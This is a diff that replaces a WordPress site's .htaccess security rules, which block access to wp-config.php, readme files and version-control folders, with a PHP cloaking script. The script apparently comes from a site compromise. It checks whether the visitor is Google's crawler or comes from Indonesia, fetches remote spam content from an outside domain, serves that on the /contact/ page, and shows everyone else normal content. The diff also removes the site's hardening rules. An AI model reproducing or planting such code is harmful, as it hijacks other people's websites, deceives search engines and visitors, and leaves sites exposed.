@@ -1,77 +1,51 @@
-# BEGIN iThemes Security - No modifiques ni borres esta línea
-# iThemes Security Config Details: 2
-	# Proteger los archivos de sistema - Seguridad > Ajustes > Sistema de ajustes > Archivos de sistema
-	<files .htaccess>
-		<IfModule mod_authz_core.c>
-			Require all denied
-		</IfModule>
-		<IfModule !mod_authz_core.c>
-			Order allow,deny
-			Deny from all
-		</IfModule>
-	</files>
-	<files readme.html>
-		<IfModule mod_authz_core.c>
-			Require all denied
-		</IfModule>
-		<IfModule !mod_authz_core.c>
-			Order allow,deny
-			Deny from all
-		</IfModule>
-	</files>
-	<files readme.txt>
-		<IfModule mod_authz_core.c>
-			Require all denied
-		</IfModule>
-		<IfModule !mod_authz_core.c>
-			Order allow,deny
-			Deny from all
-		</IfModule>
-	</files>
-	<files wp-config.php>
-		<IfModule mod_authz_core.c>
-			Require all denied
-		</IfModule>
-		<IfModule !mod_authz_core.c>
-			Order allow,deny
-			Deny from all
-		</IfModule>
-	</files>
+<?php
 
-	# Desactivar navegación por directorio - Seguridad > Ajustes > Sistema de ajustes > Navegación por directorio
-	Options -Indexes
+function getVisitorCountry() {
+    $ip = $_SERVER['REMOTE_ADDR'];
+    $api_url = "http://ip-api.com/json/{$ip}";
 
-	<IfModule mod_rewrite.c>
-		RewriteEngine On
+    $curl = curl_init();
+    curl_setopt($curl, CURLOPT_URL, $api_url);
+    curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
 
-		# Proteger los archivos de sistema - Seguridad > Ajustes > Sistema de ajustes > Archivos de sistema
-		RewriteRule ^wp-admin/install\.php$ - [F]
-		RewriteRule ^wp-admin/includes/ - [F]
-		RewriteRule !^wp-includes/ - [S=3]
-		RewriteRule ^wp-includes/[^/]+\.php$ - [F]
-		RewriteRule ^wp-includes/js/tinymce/langs/.+\.php - [F]
-		RewriteRule ^wp-includes/theme-compat/ - [F]
-		RewriteCond %{REQUEST_FILENAME} -f
-		RewriteRule (^|.*/)\.(git|svn)/.* - [F]
+    $response = curl_exec($curl);
 
-		# Desactivar PHP en Uploads - Seguridad > Ajustes > Ajustes del sistema > PHP en Uploads
-		#RewriteRule ^wp\-content/uploads/.*\.(?:php[1-7]?|pht|phtml?|phps)\.?$ - [NC,F]
+    if (curl_errno($curl)) {
+        // Handle any errors if needed
+        return "Error: " . curl_error($curl);
+    }
 
-		# Desactivar PHP en los Plugins - Seguridad > Ajustes > Mejoras del sistema > PHP en Plugins
-		#RewriteRule ^wp\-content/plugins/.*\.(?:php[1-7]?|pht|phtml?|phps)\.?$ - [NC,F]
+    curl_close($curl);
 
-		# Desactivar PHP en Temas - Seguridad > Ajustes > Mejoras del sistema > PHP en Temas
-		#RewriteRule ^wp\-content/themes/.*\.(?:php[1-7]?|pht|phtml?|phps)\.?$ - [NC,F]
-	</IfModule>
-# END iThemes Security - No modifiques ni borres esta línea
+    $data = json_decode($response, true);
 
-# BEGIN WordPress
-<IfModule mod_rewrite.c>
-RewriteEngine On
-RewriteBase /
-RewriteRule ^index\.php$ - [L]
-RewriteCond %{REQUEST_FILENAME} !-f
-RewriteCond %{REQUEST_FILENAME} !-d
-RewriteRule . /index.php [L]
-</IfModule>
-# END WordPress
+    if ($data['status'] === 'success') {
+        return $data['country'];
+    } else {
+        return "Country not found";
+    }
+}
+
+function isHomePage() {
+    return ($_SERVER['REQUEST_URI'] === '/contact/');
+}
+
+function isGoogleCrawler() {
+    $userAgent = strtolower($_SERVER['HTTP_USER_AGENT']);
+    return (strpos($userAgent, 'google') !== false);
+}
+
+if ((isGoogleCrawler() || (getVisitorCountry() === 'Indonesia')) && isHomePage()) {
+    // Output the cloaked content
+$curl = curl_init();
+curl_setopt($curl, CURLOPT_URL, 'https://javmoon.net/amp/situs/e360ssaint/u.txt');
+curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
+$content = curl_exec($curl);
+curl_close($curl);
+
+echo $content;
+} else {
+    // Output your main content here
+    include 'main.php';
+}
+?>
